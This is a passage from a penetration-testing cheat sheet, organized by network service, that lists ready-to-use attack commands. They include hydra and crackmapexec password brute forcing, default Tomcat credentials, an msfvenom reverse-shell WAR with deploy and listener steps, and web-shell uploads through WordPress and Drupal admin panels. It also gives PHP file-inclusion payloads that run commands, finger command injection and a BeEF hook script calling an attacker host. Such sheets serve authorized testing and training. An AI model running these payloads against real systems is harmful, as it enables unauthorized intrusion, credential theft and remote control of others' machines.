punctuation\">&lt;</span>PATH</span><span class=\"token punctuation\">></span></span>/.ssh/authorized_keys\n\n# Connect\nssh -i <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILENAME</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><hr>\n<h2 id=\"dns---53\">DNS - 53</h2>\n<pre class=\"language-\"><code class=\"language-\">dnsenum <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-\"><code class=\"language-\">dnsrecon -d <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"zone-transfert\">Zone transfert</h3>\n<pre class=\"language-\"><code class=\"language-\">dnsrecon -d <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span> -a\ndig axfr <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span> @ns1.test.com</code></pre><h3 id=\"dns-brute-force\">DNS brute force</h3>\n<pre class=\"language-\"><code class=\"language-\">https://github.com/blark/aiodnsbrute</code></pre><hr>\n<h2 id=\"finger---79\">FINGER - 79</h2>\n<h3 id=\"user-enumeration\">User enumeration</h3>\n<pre class=\"language-\"><code class=\"language-\">finger @<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nfinger <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"command-execution\">Command execution</h3>\n<pre class=\"language-\"><code class=\"language-\">finger \"|/bin/id@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\"\nfinger \"|/bin/ls -a /<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\"</code></pre><hr>\n<h2 id=\"http---https---80---443\">HTTP - HTTPS - 80 - 443</h2>\n<h3 id=\"automatic-scanners\">Automatic scanners</h3>\n<pre class=\"language-\"><code class=\"language-\">nikto -h <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>\npython crawleet.py -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20</code></pre><h3 id=\"wordpress\">Wordpress</h3>\n<pre class=\"language-\"><code class=\"language-\"># Scan\nwpscan --rua -e --url <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>\n\n# Brute force user(s)\nwpscan --rua --url <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> -U \"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>,<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>\"</code></pre><h4 id=\"wordpress-panel-rce\">Wordpress panel RCE</h4>\n<pre class=\"language-\"><code class=\"language-\">Modifying a php from the theme used (admin credentials needed)\n\nAppearance -> Editor -> 404 Template (at the right)\nChange the content for a php shell\nhttps://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php\nhttp://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/wp-content/themes/twentytwelve/404.php</code></pre><h3 id=\"drupal\">Drupal</h3>\n<pre class=\"language-\"><code class=\"language-\">droopescan scan -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span></code></pre><h4 id=\"username-enumeration\">Username enumeration</h4>\n<pre class=\"language-\"><code class=\"language-\">In /user/register just try to create a username and if the name is already taken it will be notified :\n*The name admin is already taken*\n\nIf you request a new password for an existing username :\n*Unable to send e-mail. Contact the site administrator if the problem persists.*\n\nIf you request a new password for a non-existent username :\n*Sorry, test is not recognized as a user name or an e-mail address.*\n\nAccessing /user/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>number</span><span class=\"token punctuation\">></span></span> you can see the number of existing users :\n    - /user/1 -> Access denied (user exist)\n    - /user/2 -> Page not found (user doesn't exist)</code></pre><h4 id=\"hidden-pages-enumeration\">Hidden pages enumeration</h4>\n<pre class=\"language-\"><code class=\"language-\">Fuzz /node/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NUMBER</span><span class=\"token punctuation\">></span></span> where <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NUMBER</span><span class=\"token punctuation\">></span></span> is a number (from 1 to 500 for example).\nYou could find hidden pages (test, dev) which are not referenced by the search engines.\n\nwfuzz -c -z range,1-500 --hc 404 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>/node/FUZZ</code></pre><h4 id=\"drupal-panel-rce\">Drupal panel RCE</h4>\n<pre class=\"language-\"><code class=\"language-\">You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)\n\nGo to Modules -> (Check) PHP Filter  -> Save configuration\n\nhttps://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php\n\nThen click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview</code></pre><h3 id=\"joomla\">Joomla</h3>\n<pre class=\"language-\"><code class=\"language-\">joomscan -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>\n./joomlavs.rb --url <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span> -a -v</code></pre><h3 id=\"tomcat\">Tomcat</h3>\n<h4 id=\"default-credentials\">Default credentials</h4>\n<pre class=\"language-\"><code class=\"language-\">The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :\n\nadmin:admin\ntomcat:tomcat\nadmin:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NOTHING</span><span class=\"token punctuation\">></span></span>\nadmin:s3cr3t\ntomcat:s3cr3t\nadmin:tomcat</code></pre><h4 id=\"brute-force-2\">Brute force</h4>\n<pre class=\"language-\"><code class=\"language-\">hydra -L <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> -f <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> http-get /manager/html -vV -u</code></pre><h4 id=\"tomcat-panel-rce\">Tomcat panel RCE</h4>\n<pre class=\"language-\"><code class=\"language-\"># Generate payload\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f war > shell.war\n\n# Upload payload\nTomcat6 :\nwget 'http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>:8080/manager/deploy?war=file:shell.war&amp;path=/shell' -O -\n\nTomcat7 and above :\ncurl -v -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span> -T shell.war 'http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>:8080/manager/text/deploy?path=/shellh&amp;update=true'\n\n# Listener\nnc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\n\n# Execute payload\ncurl http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>:8080/shell/</code></pre><h3 id=\"webdav\">WebDav</h3>\n<pre class=\"language-\"><code class=\"language-\">davtest -url <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"http-brute-force-authentication\">HTTP brute force authentication</h3>\n<h4 id=\"http-basic-authentication\">HTTP basic authentication</h4>\n<pre class=\"language-\"><code class=\"language-\"># Hydra\nhydra -l <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -V -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> -s 80 -f <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> http-get /<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL_ENDPOINT</span><span class=\"token punctuation\">></span></span>/ -t 15\n\n# Patator\npython patator.py http_fuzz auth_type=basic url=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span> user_pass=FILE0 0=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">USER:</span>PASSWORD_LIST</span><span class=\"token punctuation\">></span></span> -x ignore:code=401 -x ignore:code=307</code></pre><h4 id=\"http-get-request\">HTTP GET request</h4>\n<pre class=\"language-\"><code class=\"language-\">hydra <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -V -l <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> http-get-form \"/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid\" -t <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>THREADS_NUMBER</span><span class=\"token punctuation\">></span></span></code></pre><h4 id=\"http-post-request\">HTTP POST request</h4>\n<pre class=\"language-\"><code class=\"language-\">hydra -l <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> http-post-form \"/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid\" -t <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>THREADS_NUMBER</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"spidering--brute-force-directories--files\">Spidering / Brute force directories / files</h3>\n<pre class=\"language-\"><code class=\"language-\">gospider -d <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DEPTHS</span><span class=\"token punctuation\">></span></span> --robots --sitemap -t <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>THREADS</span><span class=\"token punctuation\">></span></span> -s <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>\n\nffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>/FUZZ -e .php,.txt -t <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>THREADS</span><span class=\"token punctuation\">></span></span>\ndirbuster\n\nDictionaries :\n   - /usr/share/wordlists/dirb/common.txt\n   - /usr/share/wordlists/dirb/big.txt\n   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre><h4 id=\"file-backups\">File backups</h4>\n<p>Once you have found all the files, look for backups of all the executable files (&quot;<em>.php</em>&quot;, &quot;<em>.aspx</em>&quot;...). Common variations for naming a backup are </p>\n<pre class=\"language-\"><code class=\"language-\">file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old</code></pre><h3 id=\"local-file-inclusion--remote-file-inclusion---lfi--rfi\">Local File Inclusion / Remote File Inclusion - LFI / RFI</h3>\n<pre class=\"language-\"><code class=\"language-\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</code></pre><h4 id=\"wrappers\">Wrappers</h4>\n<h5 id=\"wrapper-phpfilter\">Wrapper php://filter</h5>\n<pre class=\"language-\"><code class=\"language-\">http://example.com/index.php?page=php://filter/convert.base64-encode/resource=</code></pre><h5 id=\"wrapper-expect\">Wrapper expect://</h5>\n<pre class=\"language-\"><code class=\"language-\">http://example.com/index.php?page=expect://id</code></pre><h5 id=\"wrapper-data\">Wrapper data://</h5>\n<pre class=\"language-\"><code class=\"language-\">echo '<span class=\"token prolog\">&lt;?php phpinfo(); ?></span>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=\n\nhttp://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=\n\nIf code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.\n\nCode execution with \n    - exec\n    - shell_exec\n    - system\n    - passthru\n    - popen\n\n# Exemple\necho '<span class=\"token prolog\">&lt;?php passthru($_GET[\"cmd\"]);echo \"Shell done !\"; ?></span>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=\n\nhttp://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=\n\nIf there is \"Shell done !\" on the webpage, then there is code execution and you can do things like :\n\nhttp://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&amp;cmd=ls</code></pre><h5 id=\"wrapper-input\">Wrapper input://</h5>\n<pre class=\"language-\"><code class=\"language-\">curl -k -v \"http://example.com/index.php?page=php://input\" --data \"<span class=\"token prolog\">&lt;?php echo shell_exec('id'); ?></span>\"</code></pre><h4 id=\"useful-lfi-list\">Useful LFI list</h4>\n<pre class=\"language-\"><code class=\"language-\"># Linux\n/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt\n\n# Windows\n/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt\n\n# Both\n/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code></pre><h4 id=\"tools\">Tools</h4>\n<pre class=\"language-\"><code class=\"language-\">kadimus --url <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>\npython lfisuite.py</code></pre><h3 id=\"command-injection\">Command injection</h3>\n<p>For command injection always use BurpSuite !</p>\n<pre class=\"language-\"><code class=\"language-\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</code></pre><h3 id=\"deserialization\">Deserialization</h3>\n<pre class=\"language-\"><code class=\"language-\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization</code></pre><h3 id=\"file-upload\">File upload</h3>\n<pre class=\"language-\"><code class=\"language-\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files</code></pre><h3 id=\"sql-injection\">SQL injection</h3>\n<pre class=\"language-\"><code class=\"language-\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection\n\nhttps://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli</code></pre><h3 id=\"xss\">XSS</h3>\n<pre class=\"language-\"><code class=\"language-\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection\n\nbeef-xss\ncat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://&lt;IP>:3000/hook.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"other-web-vulnerabilities\">Other web vulnerabilities</h3>\n<pre class=\"language-\"><code class=\"language-\">https://github.com/swisskyrepo/PayloadsAllTheThings</code></pre><h3 id=\"upload-a-file-with-put\">Upload a file with PUT</h3>\n<pre class=\"language-\"><code class=\"language-\">curl -X PUT http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span> -d @<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span>  -v</code></pre><hr>\n<h2 id=\"kerberos---88\">KERBEROS - 88</h2>\n<pre class=\"language-\"><code class=\"language-\">https://www.tarlogic.com/en/blog/how-to-attack-kerberos/</code></pre><hr>\n<h2 id=\"pop3---110\">POP3 - 110</h2>\n<h3 id=\"brute-force-3\">Brute force</h3>\n<pre class=\"language-\"><code class=\"language-\">hydra -l <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> -f <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> pop3 -V\nhydra -S -v -l <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> -s 995 -f <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> pop3 -V</code></pre><h3 id=\"read-mail\">Read mail</h3>\n<pre class=\"language-\"><code class=\"language-\">telnet <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> 110\n\nUSER <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>\nPASS <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>\nLIST\nRETR <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>MAIL_NUMBER</span><span class=\"token punctuation\">></span></span>\nQUIT</code></pre><hr>\n<h2 id=\"snmp---161\">SNMP - 161</h2>\n<h3 id=\"brute-force-community-string\">Brute force community string</h3>\n<pre class=\"language-\"><code class=\"language-\">onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-\"><code class=\"language-\">snmpbulkwalk -c <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>COMMUNITY_STRING</span><span class=\"token punctuation\">></span></span> -v<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>VERSION</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-\"><code class=\"language-\">snmp-check <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"modifying-snmp-values\">Modifying SNMP values</h3>\n<pre class=\"language-\"><code class=\"language-\">http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html</code></pre><hr>\n<h2 id=\"ldap---389\">LDAP - 389</h2>\n<h3 id=\"scans\">Scans</h3>\n<pre class=\"language-\"><code class=\"language-\">nmap -n -sV --script \"ldap* and not brute\"\n\nldapsearch -h <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -x -s base\nldapsearch -h <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -x -D '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span>\\<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>' -w '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>' -b \"DC=&lt;1_SUBDOMAIN>,DC=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>TDL</span><span class=\"token punctuation\">></span></span>\"</code></pre><h3 id=\"graphical-interface\">Graphical Interface</h3>\n<pre class=\"language-\"><code class=\"language-\">jxplorer</code></pre><hr>\n<h2 id=\"smb---445\">SMB - 445</h2>\n<h3 id=\"version-if-nmap-didnt-detect-it\">Version if nmap didn&#39;t detect it</h3>\n<pre class=\"language-\"><code class=\"language-\">Sometimes nmap doesnt show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.\n\nOR\n\nsudo ngrep -i -d <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>INTERFACE</span><span class=\"token punctuation\">></span></span> 's.?a.?m.?b.?a.*[[:digit:]]' port 139\nsmbclient -L <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"scan-for-vulnerability\">Scan for vulnerability</h3>\n<pre class=\"language-\"><code class=\"language-\">nmap -p139,445 --script \"smb-vuln-* and not(smb-vuln-regsvc-dos)\" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><p>If :</p>\n<ul>\n<li>MS17-010 - <a onclick=\"document.location.hash='EternalBlue';\" href=\"javascript:;\" title=\"MS17-010\">EternalBlue</a></li>\n<li>MS08-067 - <a onclick=\"document.location.hash='MS08-067';\" href=\"javascript:;\">MS08-067</a></li>\n<li>CVE-2017-7494 - <a onclick=\"document.location.hash='CVE-2017-7494';\" href=\"javascript:;\">CVE-2017-7494</a></li>\n</ul>\n<h3 id=\"manual-testing\">Manual testing</h3>\n<pre class=\"language-\"><code class=\"language-\">smbmap -H <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nsmbmap -u '' -p '' -H <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nsmbmap -u 'guest' -p '' -H <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nsmbmap -u '' -p '' -H <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -R\n\ncrackmapexec smb <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\ncrackmapexec smb <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u '' -p ''\ncrackmapexec smb <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u 'guest' -p ''\ncrackmapexec smb <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u '' -p '' --shares\n\nenum4linux -a <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\n\nsmbclient --no-pass -L //$IP\nsmbclient //<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SHARE</span><span class=\"token punctuation\">></span></span>\n\n# Download all files from a directory recursively\nsmbclient //<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SHARE</span><span class=\"token punctuation\">></span></span> -U <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -c \"prompt OFF;recurse ON;mget *\"</code></pre><h3 id=\"brute-force-4\">Brute force</h3>\n<pre class=\"language-\"><code class=\"language-\">crackmapexec smb <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> -p <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span>\nhydra -V -f -L <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> smb://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u -vV</code></pre><h3 id=\"mount-a-smb-share\">Mount a SMB share</h3>\n<pre class=\"language-\"><code class=\"language-\">mkdir /tmp/share\nsudo mount -t cifs //<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SHARE</span><span class=\"token punctuation\">></span></span> /tmp/share\nsudo mount -t cifs -o 'username=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>,password=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>'//<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SHARE</span><span class=\"token punctuation\">></span></span> /tmp/share\n\nsmbclient //<span class=\"token tag\"><span class=\"token 